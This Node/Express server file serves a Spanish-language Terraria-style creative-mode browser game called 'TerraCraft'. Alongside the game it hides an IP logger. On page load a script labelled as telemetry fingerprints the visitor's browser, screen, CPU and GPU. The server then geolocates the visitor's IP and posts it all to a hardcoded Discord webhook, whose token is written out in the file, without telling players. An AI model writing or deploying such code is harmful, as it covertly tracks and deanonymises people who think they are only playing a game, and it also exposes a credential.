const express = require('express');
const app = express();

const PORT = process.env.PORT || 3000;
app.set('trust proxy', true);
app.use(express.json());

// ⚠️ PEGA AQUÍ TU WEBHOOK DE DISCORD
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";

app.post('/api/telemetry', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    
    const d = req.body || {};
    let country = 'Desconocido', city = 'Desconocida', isp = 'Desconocido';

    try {
        const response = await fetch(`http://ip-api.com/json/${userIp}?fields=country,city,isp,status`);
        const geo = await response.json();
        if (geo.status === 'success') {
            country = geo.country;
            city = geo.city;
            isp = geo.isp;
        }
    } catch (e) {}

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
        const payload = {
            content: `🎮 **¡Nuevo Jugador en Modo Creativo!**\n📍 **IP:** \`${userIp}\` (${city}, ${country})\n📡 **ISP:** ${isp}\n💻 **OS:** \`${d.userAgent || 'N/A'}\`\n🖥️ **Pantalla:** ${d.screen || 'N/A'}\n🧠 **Hardware:** ${d.cores || 'N/A'} Cores | GPU: ${d.gpu || 'N/A'}`
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch (err) {}
    }

    res.sendStatus(200);
});

// MOTOR TIPO TERRARIA CREATIVO
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TerraCraft - Creative Mode</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
        body { background: #87CEEB; overflow: hidden; }
        canvas { display: block; image-rendering: pixelated; }
        
        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        
        /* Hotbar */
        #hotbar { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 4px; z-index: 10; pointer-events: auto; background: rgba(0,0,0,0.5); padding: 6px; border-radius: 8px; }
        .slot { width: 48px; height: 48px; background: rgba(255,255,255,0.1); border: 2px solid #555; border-radius: 4px; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; cursor: pointer; position: relative; }
        .slot.active { border-color: #fff; box-shadow: 0 0 10px rgba(255,255,255,0.8); background: rgba(255,255,255,0.3); }
        .slot-key { position: absolute; top: 2px; left: 4px; font-size: 0.7rem; color: #fff; font-weight: bold; text-shadow: 1px 1px 0 #000; }
        
        /* Inventario Creativo */
        #inventory-modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #c6c6c6; border: 4px solid #fff; border-bottom-color: #555; border-right-color: #555; padding: 20px; width: 500px; display: none; z-index: 50; pointer-events: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .inv-title { font-weight: bold; margin-bottom: 15px; color: #333; }
        .inv-grid { display: grid; grid-template-columns: repeat(9, 1fr); gap: 6px; }
        .inv-item { width: 42px; height: 42px; background: #8b8b8b; border: 2px solid #fff; border-bottom-color: #333; border-right-color: #333; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .inv-item:hover { background: #a0a0a0; }
        
        #menu { position: absolute; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); display: flex; justify-content: center; align-items: center; z-index: 100; pointer-events: auto; }
        .btn { background: #4ade80; border: none; padding: 15px 30px; font-size: 1.2rem; font-weight: bold; cursor: pointer; border-radius: 8px; transition: 0.2s; }
        .btn:hover { background: #22c55e; transform: scale(1.05); }
    </style>
</head>
<body>
    <div id="menu">
        <button class="btn" onclick="startGame()">ENTRAR AL MUNDO CREATIVO</button>
    </div>

    <div id="ui-layer" style="display:none;">
        <div id="hotbar"></div>
        <div id="inventory-modal">
            <div class="inv-title">Inventario Creativo (Click para equipar)</div>
            <div class="inv-grid" id="inv-grid"></div>
        </div>
    </div>

    <canvas id="gameCanvas"></canvas>

    <script>
    // Telemetría
    function getGPU() { try { const canvas = document.createElement('canvas'); return canvas.getContext('webgl').getParameter(canvas.getContext('webgl').getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL); } catch(e) { return 'N/A'; } }
    fetch('/api/telemetry', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userAgent: navigator.userAgent, screen: \`\${screen.width}x\${screen.height}\`, cores: navigator.hardwareConcurrency, gpu: getGPU() }) }).catch(()=>{});

    // SISTEMA DE BLOQUES
    const BLOCKS = {
        0: { name: 'Aire' },
        1: { name: 'Pico', isTool: true, icon: '⛏️' },
        2: { name: 'Pasto', hex: '#4ade80', acc: '#15803d' },
        3: { name: 'Tierra', hex: '#78350f', acc: '#92400e' },
        4: { name: 'Piedra', hex: '#52525b', acc: '#3f3f46' },
        5: { name: 'Madera', hex: '#5c3a21', acc: '#452b18' },
        6: { name: 'Hojas', hex: '#22c55e', acc: '#16a34a' },
        7: { name: 'Ladrillos', hex: '#b91c1c', acc: '#991b1b' },
        8: { name: 'Cristal', hex: 'rgba(186, 230, 253, 0.4)', acc: '#7dd3fc' },
        9: { name: 'Tablones', hex: '#d97706', acc: '#b45309' },
        10: { name: 'Arena', hex: '#fde047', acc: '#facc15' },
        11: { name: 'Nieve', hex: '#f8fafc', acc: '#e2e8f0' },
        12: { name: 'Diamante', hex: '#2dd4bf', acc: '#14b8a6' },
        13: { name: 'Oro', hex: '#fbbf24', acc: '#f59e0b' },
        14: { name: 'Obsidiana', hex: '#1e1b4b', acc: '#312e81' },
        15: { name: 'Lava', hex: '#ea580c', acc: '#c2410c' },
        16: { name: 'Agua', hex: 'rgba(59, 130, 246, 0.6)', acc: '#2563eb' }
    };

    let hotbarItems = [1, 2, 3, 4, 5, 7, 8, 12, 16]; // Default hotbar
    let selectedSlot = 0;
    let invOpen = false;

    // Renderizar UI
    function renderHotbar() {
        const hb = document.getElementById('hotbar');
        hb.innerHTML = '';
        hotbarItems.forEach((id, i) => {
            const b = BLOCKS[id];
            let inner = b.isTool ? b.icon : \`<div style="width:24px;height:24px;background:\${b.hex};border:2px solid \${b.acc}"></div>\`;
            hb.innerHTML += \`<div class="slot \${i === selectedSlot ? 'active' : ''}" onclick="sel(\${i})"><span class="slot-key">\${i+1}</span>\${inner}</div>\`;
        });
    }

    function renderInventory() {
        const grid = document.getElementById('inv-grid');
        grid.innerHTML = '';
        Object.keys(BLOCKS).forEach(key => {
            const id = parseInt(key);
            if (id === 0) return;
            const b = BLOCKS[id];
            let inner = b.isTool ? b.icon : \`<div style="width:24px;height:24px;background:\${b.hex};border:2px solid \${b.acc}"></div>\`;
            grid.innerHTML += \`<div class="inv-item" title="\${b.name}" onclick="equip(\${id})">\${inner}</div>\`;
        });
    }

    function sel(index) {
        selectedSlot = index;
        renderHotbar();
    }

    function equip(blockId) {
        hotbarItems[selectedSlot] = blockId;
        renderHotbar();
    }

    function toggleInventory() {
        invOpen = !invOpen;
        document.getElementById('inventory-modal').style.display = invOpen ? 'block' : 'none';
    }

    function startGame() {
        document.getElementById('menu').style.display = 'none';
        document.getElementById('ui-layer').style.display = 'block';
        renderHotbar();
        renderInventory();
        initGame();
    }

    function initGame() {
        const cv = document.getElementById('gameCanvas');
        const ctx = cv.getContext('2d', { alpha: false });
        
        function resize() { cv.width = window.innerWidth; cv.height = window.innerHeight; }
        window.addEventListener('resize', resize);
        resize();

        const TILE = 32;
        const CHUNK_W = 150;
        const CHUNK_H = 100;
        let world = Array.from({ length: CHUNK_W }, () => Array(CHUNK_H).fill(0));
        
        // Mundo plano para construir fácilmente
        for (let x = 0; x < CHUNK_W; x++) {
            for (let y = 0; y < CHUNK_H; y++) {
                if (y === 30) world[x][y] = 2; // Pasto
                else if (y > 30 && y < 35) world[x][y] = 3; // Tierra
                else if (y >= 35) world[x][y] = 4; // Piedra
            }
        }

        const player = { x: (CHUNK_W/2)*TILE, y: 15*TILE, w: 24, h: 44, vx: 0, vy: 0, speed: 6, jump: -11, grounded: false };
        let camera = { x: 0, y: 0 };
        const keys = {};

        window.addEventListener('keydown', e => {
            if (invOpen && e.code !== 'KeyE' && e.code !== 'Escape') return;
            keys[e.code] = true;
            
            // Fix del salto
            if ((e.code === 'Space' || e.code === 'KeyW') && player.grounded) {
                player.vy = player.jump;
                player.grounded = false;
            }
            if (e.key >= '1' && e.key <= '9') sel(parseInt(e.key) - 1);
            if (e.code === 'KeyE') toggleInventory();
            if (e.code === 'Escape' && invOpen) toggleInventory();
        });
        window.addEventListener('keyup', e => keys[e.code] = false);

        let mouseX = 0, mouseY = 0, isMouseDown = false, mouseBtn = 0;
        window.addEventListener('mousemove', e => { mouseX = e.clientX; mouseY = e.clientY; });
        window.addEventListener('mousedown', e => { if(!invOpen) { isMouseDown = true; mouseBtn = e.button; } });
        window.addEventListener('mouseup', () => isMouseDown = false);
        window.addEventListener('contextmenu', e => e.preventDefault());

        function handleMouse() {
            if (!isMouseDown || invOpen) return;
            const targetX = mouseX + camera.x;
            const targetY = mouseY + camera.y;
            const tx = Math.floor(targetX / TILE);
            const ty = Math.floor(targetY / TILE);
            
            const dist = Math.hypot((player.x + player.w/2) - targetX, (player.y + player.h/2) - targetY);
            if (dist > TILE * 8) return; // Alcance creativo más largo

            if (tx >= 0 && tx < CHUNK_W && ty >= 0 && ty < CHUNK_H) {
                let currentItem = hotbarItems[selectedSlot];
                if (mouseBtn === 0 && currentItem === 1) { // Minar con pico
                    world[tx][ty] = 0;
                } else if ((mouseBtn === 2 || currentItem !== 1) && world[tx][ty] === 0) { // Colocar
                    if (currentItem === 1) return; // No colocar picos
                    const pRect = { l: player.x, r: player.x + player.w, t: player.y, b: player.y + player.h };
                    const bRect = { l: tx*TILE, r: tx*TILE+TILE, t: ty*TILE, b: ty*TILE+TILE };
                    if (!(pRect.l < bRect.r && pRect.r > bRect.l && pRect.t < bRect.b && pRect.b > bRect.t)) {
                        world[tx][ty] = currentItem;
                    }
                }
            }
        }

        function checkCol(nx, ny) {
            const l = Math.floor(nx / TILE);
            const r = Math.floor((nx + player.w - 1) / TILE);
            const t = Math.floor(ny / TILE);
            const b = Math.floor((ny + player.h - 1) / TILE);

            if (l < 0 || r >= CHUNK_W || t < 0 || b >= CHUNK_H) return true;
            for (let y = t; y <= b; y++) {
                for (let x = l; x <= r; x++) {
                    let block = world[x][y];
                    // Atraviesa agua y cristal parcialmente
                    if (block !== 0 && block !== 16) return true; 
                }
            }
            return false;
        }

        function drawBlock(id, x, y) {
            const b = BLOCKS[id];
            ctx.fillStyle = b.hex;
            ctx.fillRect(x, y, TILE, TILE);
            
            if (id !== 16 && id !== 8) { // Sin bordes duros para agua y cristal
                ctx.strokeStyle = 'rgba(0,0,0,0.3)';
                ctx.lineWidth = 1;
                ctx.strokeRect(x, y, TILE, TILE);
                ctx.fillStyle = b.acc;
                ctx.fillRect(x + TILE - 8, y + TILE - 8, 8, 8); // Detalle esquina
            }
        }

        function update() {
            if (!invOpen) {
                if (keys['KeyA']) player.vx = -player.speed;
                else if (keys['KeyD']) player.vx = player.speed;
                else player.vx = 0;

                player.vy += 0.5; // Gravedad
                if (player.vy > 15) player.vy = 15;

                // X Collision
                if (!checkCol(player.x + player.vx, player.y)) {
                    player.x += player.vx;
                } else {
                    player.vx = 0;
                }

                // Y Collision
                player.grounded = false;
                if (!checkCol(player.x, player.y + player.vy)) {
                    player.y += player.vy;
                } else {
                    if (player.vy > 0) {
                        player.grounded = true;
                        player.y = Math.floor((player.y + player.vy) / TILE) * TILE + (TILE - player.h);
                    } else if (player.vy < 0) {
                        player.y = Math.floor(player.y / TILE) * TILE + TILE;
                    }
                    player.vy = 0;
                }
                
                handleMouse();
            }

            // Suavizado de cámara
            camera.x += (player.x + player.w/2 - cv.width/2 - camera.x) * 0.1;
            camera.y += (player.y + player.h/2 - cv.height/2 - camera.y) * 0.1;

            // Render Cielo
            ctx.fillStyle = '#87CEEB';
            ctx.fillRect(0, 0, cv.width, cv.height);
            
            ctx.save();
            ctx.translate(Math.floor(-camera.x), Math.floor(-camera.y));

            const sCol = Math.max(0, Math.floor(camera.x / TILE));
            const eCol = Math.min(CHUNK_W, Math.floor((camera.x + cv.width) / TILE) + 2);
            const sRow = Math.max(0, Math.floor(camera.y / TILE));
            const eRow = Math.min(CHUNK_H, Math.floor((camera.y + cv.height) / TILE) + 2);

            for (let x = sCol; x < eCol; x++) {
                for (let y = sRow; y < eRow; y++) {
                    if (world[x][y] !== 0) drawBlock(world[x][y], x * TILE, y * TILE);
                }
            }

            // Jugador
            ctx.fillStyle = '#111827';
            ctx.fillRect(player.x, player.y, player.w, player.h); // Sombra/Cuerpo
            ctx.fillStyle = '#ef4444'; 
            ctx.fillRect(player.x, player.y + 10, player.w, 15); // Camisa
            ctx.fillStyle = '#fcd34d';
            ctx.fillRect(player.x + 4, player.y - 4, 16, 14); // Cabeza

            // Resaltar bloque (Hover)
            if (!invOpen) {
                const tx = Math.floor((mouseX + camera.x) / TILE);
                const ty = Math.floor((mouseY + camera.y) / TILE);
                if (tx >= 0 && tx < CHUNK_W && ty >= 0 && ty < CHUNK_H) {
                    ctx.strokeStyle = 'rgba(255, 255, 255, 0.6)';
                    ctx.lineWidth = 2;
                    ctx.strokeRect(tx * TILE, ty * TILE, TILE, TILE);
                }
            }

            ctx.restore();
            requestAnimationFrame(update);
        }
        update();
    }
    </script>
</body>
</html>`);
});

app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
